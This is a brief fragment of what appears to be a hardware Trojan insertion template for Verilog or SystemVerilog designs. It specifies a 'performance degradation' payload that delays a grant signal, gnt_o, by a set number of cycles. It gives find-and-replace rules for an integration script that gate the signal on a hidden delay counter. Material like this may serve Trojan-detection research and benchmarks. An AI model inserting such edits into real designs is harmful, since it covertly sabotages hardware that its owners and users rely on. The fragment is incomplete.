 ...
 * Payload: Delay gnt_o by N cycles
 * 
...
// ============================================================
// Performance Degradation: Delay gnt_o by DELAY_CYCLES
//
// Integration Script Must Modify:
//
// IF gnt_o is a ready/valid signal:
//   Find: assign gnt_o = ready_condition;
//   Replace: assign gnt_o = (delay_counter == 0) ? ready_condition : 1'b0;
//
// IF gnt_o is in always_ff:
//   Find: gnt_o <= ready_value;
//   Replace: gnt_o <= (delay_counter == 0) ? ready_value : 1'b0;